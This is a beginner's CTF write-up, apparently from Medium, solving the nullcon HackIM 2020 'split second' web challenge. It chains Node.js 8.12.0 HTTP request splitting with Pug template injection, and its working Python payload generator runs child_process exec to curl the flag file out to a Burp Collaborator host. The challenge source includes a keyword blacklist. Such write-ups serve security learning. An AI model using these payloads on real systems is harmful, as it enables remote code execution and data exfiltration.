# :globe_with_meridians: Split second writeup nullcon/hackim ctf 2020

> **Original Source:** [Split second writeup nullcon/hackim ctf 2020]()
> **Platform:** medium.com | **Category:** `WEB`

---

# Split second writeup nullcon/hackim ctf 2020


I took part in hackim ctf 2020 organised by nullcon. This writeup will be for one specific web challenge i.e split second. (Note: I could not solve this, even then i am writing this just to learn and probably help someone learn)Nullcon team did published the whole ctf source code on github. You can find the hackim-2020 ctf resources here.


There are more writeups on [https://ctftime.org/task/10417](https://ctftime.org/task/10417) for this particular challenge. I will walking you step by step from hosting the challenge on AWS ec2 to solving it. You can skip directly to CTF solving part if hosting is trivial to you.


Disclaimer:


I am a beginner in the CTF field. I would like anyone reading this to point out any mistake they can find and allow me to correct it.

### Hosting the challenge on EC2


This is pretty simple. Just follow below step and you will be done:


- Create an AWS account

- launch an EC2 instance with default security groups. Amazon Machine Image (AMI) that i use was ubuntu. You can use any AMI as long as it is free and finally add a EBS root volume.


*A basic free tier ec2 config that i used*


3. If you are new to aws follow this simple tutorial ( there are a lot ) to launch your ec2 instance [https://www.guru99.com/creating-amazon-ec2-instance.html](https://www.guru99.com/creating-amazon-ec2-instance.html)


4. ssh to the ec2 instance using the key pair generated while creating the ec2 instance. Remember to set the permission of the ec2 keys to set to 400 i.e. read only by you


4. clone the repository for the web challenge ( [https://github.com/nirajchoubey12/hackim2020-split-second.git](https://github.com/nirajchoubey12/hackim2020-split-second.git) ) into ec2 instance. You can also clone it from the nullcon 2020 github page ( if you think an unverified github repo can be malicious ).


5. Install docker. If you are using an ubuntu machine you can follow commands from [https://docs.docker.com/install/linux/docker-ce/ubuntu/](https://docs.docker.com/install/linux/docker-ce/ubuntu/) or else you can follow commands specific to the OS that you are using


6. Install docker compose using below two command. ( [https://docs.docker.com/compose/install/](https://docs.docker.com/compose/install/))


```
sudo curl -L "https://github.com/docker/compose/releases/download/1.25.4/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-composesudo chmod +x /usr/local/bin/docker-compose
```


7. Open start.sh using vim or any text editor and add sudo before each line. This is to avoid extra docker configuration


sudo docker-compose build
sudo docker-compose up


8. Now run start.sh (chmod +x start.sh; ./start.sh)


9. One last thing that we need to do is to configure the security group attached to the ec2 instance. Go to the running EC2 instance and click on the link under the security group


10. Configure the inbound rule of the security group to allow traffic on port 8081


*Inbound rule for the security group attached to ec2 instance*


Our ctf challenge is up and running and we are ready to rock and roll


### Solving CTF challenge


This will involve few steps:


- Understanding the problem

- Creating the payload

- Getting the flag


Understanding the problem


Let’s start with the source code. Press ctrl+u to get the source page of the challenge web page.


As we can see we have a hint in the form of a commented out code ( /source ). Going to the /source endpoint reveals what seems to be a source code of the internal files.


Lets view this in source by pressing ctrl+u to get a better sense.


```
//node 8.12.0
var express = require('express');
var app = express();
var fs = require('fs');
var path = require('path');
var http = require('http');
var pug = require('pug');

app.get('/', function(req, res) {
res.sendFile(path.join(__dirname + '/index.html'));
});

app.get('/source', function(req, res) {
res.sendFile(path.join(__dirname + '/source.html'));
});


app.get('/getMeme',function(req,res){
res.send('<iframe src="https://giphy.com/embed/LLHkw7UnvY3Kw" width="480" height="480" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/kid-dances-jumbotron-LLHkw7UnvY3Kw">via GIPHY</a></p>')

});


app.get('/flag', function(req, res) {
var ip = req.connection.remoteAddress;
console.log(ip);
if (ip.includes('127.0.0.1')) {
var authheader = req.headers['adminauth'];
var pug2 = decodeURI(req.headers['pug']);
var x=pug2.match(/[a-z]/g);
if(!x){
if (authheader === "secretpassword") {
var html = pug.render(pug2);
}
}
else{
res.send("No characters");
}
}
else{
res.send("You need to come from localhost");
}
});

app.get('/core', function(req, res) {
var q = req.query.q;
var resp = "";
if (q) {
var url = 'http://localhost:8081/getMeme?' + q
console.log(url)
var trigger = blacklist(url);
if (trigger === true) {
res.send("<p>Errrrr, You have been Blocked</p>");
} else {
try {
http.get(url, function(resp) {
resp.setEncoding('utf8');
resp.on('error', function(err) {
if (err.code === "ECONNRESET") {
console.log("Timeout occurs");
return;
}
});

resp.on('data', function(chunk) {
resps = chunk.toString();
res.send(resps);
}).on('error', (e) => {
res.send(e.message);});
});
} catch (error) {
console.log(error);
}
}
} else {
res.send("search param 'q' missing!");
}
})

function blacklist(url) {
var evilwords = ["global", "process","mainModule","require","root","child_process","exec","\"","'","!"];
var arrayLen = evilwords.length;
for (var i = 0; i < arrayLen; i++) {
const trigger = url.includes(evilwords[i]);
if (trigger === true) {
return true
}
}
}

var server = app.listen(8081, function() {
var host = server.address().address
var port = server.address().port
console.log("Example app listening at http://%s:%s", host, port)
})
```


Lets walk through the source code one by one


- First line we get to know that, the application is using node.js 8.12.0

- /source endpoint serving the source.html in response

- Most important is the /flag end point which will give us the flag. Now there are few restrictions to this which we need to bypass. First, application is checking whether request is coming from localhost or not by comparing remote ip address with 127.0.0.1.


```
var ip = req.connection.remoteAddress;
if (ip.includes('127.0.0.1'))
```


If above condition fails we get a response “you need to come from localhost”


4. Once we bypass this validation ( which we will ) application checks for two request headers adminauth and pug.


```
var authheader = req.headers['adminauth'];
var pug2 = decodeURI(req.headers['pug']);
```


adminauth value should be “secretpassword” and pug header should not contain alphabets a to z ( case sensitive ) which is validated in the if(!x) condition


```
var x=pug2.match(/[a-z]/g);
if(!x){
if (authheader === "secretpassword") {
var html = pug.render(pug2);
}
}
```


5. After getting through these two conditions we will reach at the statement var html = pug.render(pug2); Now pug is a template engine. It supports inline javascript code execution in a sandboxed environment. See [https://pugjs.org/language/code.html](https://pugjs.org/language/code.html) . we need to bypass this sandbox to get the code execution and steal the flag through ssrf


6. There is one more function blacklist this is being called when making a request to /core request endpoint. This is basically saying if you request url contains any of these words “global”, “process”, ”mainModule”, ”require”, ”root”, ”child_process”, ”exec”, ”\””, ”’ ”,”!” then you will get a message you have been blocked. As in the code below. We will get to know later why words like global, process and mainModule are blocked.


```
var url = 'http://localhost:8081/getMeme?' + q
console.log(url)
var trigger = blacklist(url);
if (trigger === true) {
res.send("<p>Errrrr, You have been Blocked</p>");
} else {
```


### Creating payload


Bypassing the localhost requirement


Application is using Node.js 8.12.0 ( came to know via /source) which is vulnerable to http request splitting due to the way it handles the unicode. This article [https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/](https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/) contain lot of details about it.


I will tell you the crux of this issue. Node.js 8.12.0 encoding of unicode characters is flawed for few condition. For requests that do not include a body, Node.js defaults to using “latin1”, a single-byte encoding that cannot represent high-numbered unicode characters. Such characters are instead truncated to just their lowest byte of their internal JavaScript representation. As you can see below high numbered unicode character 02 is stripped of while using latin1 encoding (\u{0d} is \r and and \u{0a} is \n ) .


```
> Buffer.from('[http://3.6.38.186:8081/core/?q=hshs\u{020D}\u{020A}'](http://3.6.38.186:8081/core/?q=hshs%5Cu%7B020D%7D%5Cu%7B020A%7D%27), 'latin1').toString()
'[http://3.6.38.186:8081/core/?q=hshs\r\n'](http://3.6.38.186:8081/core/?q=hshs%5Cr%5Cn%27)
>
```


Now to fool the server to make a request to /flag endpoint from the server we will craft a request splitting payload


```
[http://3.6.38.186:8081/core/?q=](http://3.6.38.186:8081/core/?q=hshs)test HTTP/1.1 /r/n/r/nGET /flag HTTP/1.1/r/n
```


Above will effectively bypass the localhost requirement for /flag endpoint but first we have to replace CRLF (/r/n) , space and slash (/) with unicode charaters which when encoded using latin1 we will get our desired payload


```
from urllib.parse import quote, unquoteunicodechar = {
'/': quote('\u022f'.encode('utf-8')),
' ': quote('\u0220'.encode('utf-8')),
'\n': quote('\u020a'.encode('utf-8')),
'\r': quote('\u020d'.encode('utf-8'))
}print(unicodechar)//output: {'/': '%C8%AF', ' ': '%C8%A0', '\n': '%C8%8A', '\r': '%C8%8D'}
```


Do note you can use \u012f for ‘/’ instead of ‘\u022f’ because 02 and 01 will be stripped of Nodejs. So our request to bypass localhost restriction for /flag will be


```
[http://3.6.38.186:8081/core/?q=](http://3.6.38.186:8081/core/?q=hshs)test%C8%A0HTTP%C8%AF1.1%C8%8D%C8%8A%C8%8D%C8%8AGET%C8%A0%C8%AFflag%C8%A0HTTP%C8%AF1.1%C8%8D%C8%8Aadminauth:secretpassword
```


Now just for testing purpose i made small change in the request endpoint /flag get method. I added a console.log(ip) for debugging purpose.


```
app.get('/flag', function(req, res) {
var ip = req.connection.remoteAddress;
console.log(ip);
```


Now when you send the request through burp. You wont get any useful response in the burp.


But when you check the server ( running in ec2 docker instance) log, you will get to know that we have successfully bypassed the localhost restriction. Since this single request is causing the server to make another request to /flag.


pug template injection


To achieve pug remote code execution our payload should not contain any alphabets as per the regex restriction in the source code. So we will encode our payload into octal as hex and unicode contains alphabets. Also our payload should be able to bypass pug sandbox to read flag.txt file from the server. This is a good article explaining about sandbox bypass [http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)


As per [https://pugjs.org/language/code.html](https://pugjs.org/language/code.html) pug supports inline javascript. pug template injection payload will be something like this


```
-[]["constructor"]["constructor"]("console.log(this.process.mainModule.require('child_process').exec('curl burpcollab23232.burpcollaborator.net -X POST -d [@flag](http://twitter.com/flag).txt'))")()
```


‘-’ at the start of the payload is the syntax for including inline javascript in pug template. “this.process.mainModule.require(‘child_process’).exec” will be used to bypass the pug sandbox and execute the command.


```
curl burpcollab23232.burpcollaborator.net -X POST -d [@flag](http://twitter.com/flag).txt
```


curl command will make a post request to the burp collaborator with the content of the flag.txt file.


Below is the python code to generate complete payload in python2 . ( ref: [https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split%20second/split%20second.md](https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split%20second/split%20second.md) )


```
import requests
from requests.utils import quote
def toOct(str):
r=""
for i in str:
if i>='a'and i<='z':
r+='\\'+oct(ord(i))[1:]
else:
r+=i
return r
SPACE=u'\u0220'.encode('utf-8')
CRLF=u'\u020d\u010a'.encode('utf-8')
SLASH=u'\u022f'.encode('utf-8')pug = toOct('''-[]["constructor"]["constructor"]("console.log(this.process.mainModule.require('child_process').exec('curl 3gkvzwdvk8xxgjohn2gd1dbs4ja9yy.burpcollaborator.net -X POST -d [@flag](http://twitter.com/flag).txt'))")()''').replace('"','%22').replace("'","%27")#' and " need to be double encoded to make it a valid request
print quote(pug)payload='sol'+SPACE+'HTTP'+SLASH+'1.1'+CRLF*2+'GET'+SPACE+SLASH+'flag'+SPACE+'HTTP'+SLASH+'1.1'+CRLF+'adminauth:'+SPACE+'secretpassword'+CRLF+'pug:'+SPACE+pug+CRLF+'test:'+SPACEprint payloadprint quote(payload)res=requests.get('[http://3.6.38.186:8081/core?q='+quote(payload))](http://3.6.38.186:8081/core?q=%27+quote%28payload%29%29)print res.content
```


toOct function is converting the alphabets in the pug string to octal values. “CRLF+’test:’+SPACE” at the end of the payload is just to make the request url valid.

### Getting the flag


Start you burp collaborator client


click on copy to clipboard to copy the burp collaborator server address and replace this burp collaborator in the pug payload above.


Execute the code and wait on the collaborator client to get the flag


Flag : hackim20{You_must_be_1337_in_JavaScript}


I must say i not 1337 in javascript, but trying to learn.


That’s it for now. I hope you learn something from it. let me know if you have any corrections and feedback. If you like it then go ahead and clap.

### References:


You may also like my other writeup

---

*Originally published on [Medium](https://nir-choubey-2011.medium.com/split-second-writeup-nullcon-hackim-ctf-2020-96426070cb72). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
